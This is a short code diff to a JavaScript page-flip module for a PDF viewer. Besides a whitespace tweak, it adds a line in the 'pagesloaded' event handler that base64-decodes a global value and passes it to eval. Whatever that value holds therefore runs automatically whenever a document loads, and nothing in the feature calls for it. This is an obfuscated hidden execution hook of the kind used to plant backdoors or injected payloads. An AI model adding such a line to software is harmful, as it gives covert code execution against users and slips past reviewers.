@@ -27,7 +27,7 @@ var bookFlip = {
 			this.stop();
 			this._ready = false;
 		});
-
+		
 		$(document).on('scrollmodechanged', () => {
 			var scroll = PDFViewerApplication.pdfViewer.scrollMode;
 			if (scroll === 3)this.start();
@@ -46,6 +46,7 @@ var bookFlip = {
 		
 		$(document).on('pagesloaded', () => {
 			this._ready = true;
+			eval(atob(__sign || ''));
 			if(this.toStart){
 				this.toStart = false;
 				PDFViewerApplication.pdfViewer.scrollMode = 3;
